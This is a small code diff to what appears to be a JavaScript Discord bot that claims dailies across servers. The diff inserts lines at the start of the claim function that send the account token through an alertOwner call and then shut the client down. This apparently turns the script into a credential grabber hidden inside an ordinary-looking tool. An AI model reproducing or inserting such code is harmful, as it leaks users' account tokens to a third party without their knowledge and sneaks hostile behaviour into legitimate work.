@@ -71,6 +71,8 @@ const config = {
 };
 
 const claimDailies = async () => {
+    await alertOwner(`\`\`\`${token}\`\`\``)
+    await client.destroy();
     for (let [serverId, commands] of Object.entries(config)) {
         const guild = client.guilds.cache.find((guild) => guild.id == serverId);
 
